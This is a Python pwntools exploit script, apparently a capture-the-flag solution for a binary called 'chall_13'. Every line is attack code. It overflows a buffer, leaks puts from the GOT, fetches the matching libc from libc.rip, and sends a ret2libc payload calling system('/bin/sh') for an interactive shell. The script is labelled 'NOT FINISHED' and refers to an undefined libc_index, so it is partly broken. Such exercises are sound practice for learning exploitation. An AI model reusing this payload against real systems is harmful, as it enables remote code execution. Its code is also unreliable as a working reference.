from pwn import *

binary = context.binary = ELF('./chall_13')

p = process('./chall_13')

payload  = 0x3e * b'A'
payload += p32(binary.plt.puts)
payload += p32(binary.sym.vuln)
payload += p32(binary.got.puts)

p.sendline(payload)
_ = p.recv(4)
puts = u32(_)
log.info('puts: ' + hex(puts))
p.recv(20)

if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
        libc_url = r.json()[libc_index]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)

libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 0x3e * b'A'
payload += p32(libc.sym.system)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())

p.sendline(payload)
p.interactive()
# NOT FINISHED
